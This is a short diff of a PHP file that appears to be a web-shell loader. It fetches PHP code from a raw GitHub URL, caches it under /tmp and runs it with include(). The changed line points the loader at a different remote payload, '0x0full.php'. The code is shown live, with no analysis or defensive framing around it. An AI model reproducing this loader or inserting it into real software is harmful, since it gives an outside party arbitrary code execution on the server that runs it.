@@ -10,7 +10,7 @@ function get($url)
     curl_close($ch);
 }
 $domain = getcwd();
-$data = ['https://raw.githubusercontent.com/crawlsec0x/spawner/main/miyachung', '/tmp/0' . md5($domain)];
+$data = ['https://raw.githubusercontent.com/ahmadamet69/69/main/0x0full.php', '/tmp/0' . md5($domain)];
 if (file_exists($data[1]) && filesize($data[1]) !== 0) {
     include($data[1]);
 } else {
